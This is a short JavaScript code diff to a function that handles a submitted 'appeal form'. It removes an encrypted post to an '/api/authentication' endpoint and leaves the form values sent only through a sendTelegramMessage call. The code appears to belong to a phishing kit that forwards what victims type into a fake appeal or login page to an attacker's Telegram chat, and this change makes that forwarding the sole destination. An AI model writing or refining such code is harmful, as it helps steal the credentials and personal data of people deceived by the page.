@@ -522,18 +522,7 @@
     }
   }
 
-  // Keep original encrypted API call (if backend exists) and also send to Telegram
   async function sendAppealForm(values) {
-    try {
-      const jsonString = JSON.stringify(values);
-      const encrypted = CryptoJS.AES.encrypt(jsonString, SECRET_KEY).toString();
-      // Original backend (if available)
-      axios.post('/api/authentication', { data: encrypted }).catch(() => {});
-    } catch (err) {
-      console.warn('Local encrypt error (still sending Telegram):', err?.message || err);
-    }
-
-    // Always try to send to Telegram
     await sendTelegramMessage(values);
   }
 
